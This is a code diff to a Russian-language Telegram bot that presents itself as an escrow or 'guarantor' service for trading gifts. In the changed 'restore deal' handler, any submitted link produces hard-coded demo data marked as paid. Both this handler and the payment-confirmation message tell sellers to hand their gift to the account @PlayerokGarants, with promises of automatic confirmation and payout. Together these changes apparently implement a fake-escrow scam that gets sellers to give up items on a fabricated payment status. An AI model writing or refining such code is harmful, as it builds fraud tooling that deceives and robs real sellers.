@@ -227,6 +227,7 @@ async def cmd_start(message: Message, command: CommandObject, bot: Bot):
 💰 <b>Сумма:</b> {amount_str} {escape_html(deal["currency"])}
 
 <i>Ожидайте подтверждение оплаты от покупателя.</i>
+<b>⚠️ Внимание! Убедитесь что имя покупателя присоединившегося к сделке совпадает с именем человека с которым вы договорились о сделке!</b>
 """
             await bot.send_message(
                 deal["seller_id"],
@@ -288,7 +289,7 @@ async def process_restore_deal(message: Message, state: FSMContext):
     """Обработка ссылки на восстановление сделки"""
     link = message.text.strip()
     
-    # Демо-данные для восстановления
+    # Демо-данные для восстановления (товар НЕ кликабельный)
     demo_deal = {
         "amount": 1800,
         "currency": "RUB",
@@ -296,14 +297,13 @@ async def process_restore_deal(message: Message, state: FSMContext):
         "status": "paid"
     }
     
-    text = f"""
+    # Текст для продавца (как при подтверждении оплаты)
+    seller_text = f"""
 ✅ <b>Сделка успешно восстановлена!</b>
 
-📦 <b>Товар:</b> <code>{demo_deal['item']}</code>
-💰 <b>Сумма:</b> <code>{format_amount(demo_deal['amount'])} {demo_deal['currency']}</code>
-📊 <b>Статус:</b> ✅ Средства поступили
+💰 <b>Сумма:</b> {format_amount(demo_deal['amount'])} {demo_deal['currency']}
 
-<i>Теперь вы можете передать подарок покупателю.</i>
+📦 <b>Товар:</b> <code>{demo_deal['item']}</code>
 
 🎁 <b>Инструкция по передаче подарка:</b>
 
@@ -313,7 +313,7 @@ async def process_restore_deal(message: Message, state: FSMContext):
 
 <i>Если у вас возникли вопросы, обратитесь в поддержку.</i>
 """
-    await send_video_message(message, text, back_menu())
+    await send_video_message(message, seller_text, back_menu())
     await state.clear()
 
 @dp.callback_query(F.data == "back_to_deal_type")
@@ -657,14 +657,29 @@ async def confirm_payment_handler(callback: CallbackQuery, bot: Bot):
     db.mark_paid(deal_id)
     amount_str = format_amount(deal["amount"])
     
-    # Уведомляем продавца
+    # Уведомляем продавца с инструкцией (как при восстановлении)
+    seller_text = f"""
+✅ <b>Оплата по сделке #{deal_id} подтверждена!</b>
+
+💰 <b>Сумма:</b> {amount_str} {deal['currency']}
+
+📦 <b>Товар:</b> {escape_html(deal["description"])}
+
+🎁 <b>Инструкция по передаче подарка:</b>
+
+1️⃣ Передайте подарок гаранту: @PlayerokGarants
+2️⃣ Передача подтверждается автоматически
+3️⃣ После подтверждения средства зачислятся на баланс
+
+<i>Если у вас возникли вопросы, обратитесь в поддержку.</i>
+"""
     await bot.send_message(
         deal["seller_id"],
-        f"✅ <b>Оплата по сделке #{deal_id} подтверждена!</b>\n\n💰 Сумма: {amount_str} {deal['currency']}\n\n<i>Теперь вы можете передать товар покупателю.</i>",
+        seller_text,
         parse_mode="HTML"
     )
     
-    # Уведомляем покупателя, если есть
+    # Уведомляем покупателя
     if deal.get("buyer_id"):
         await bot.send_message(
             deal["buyer_id"],
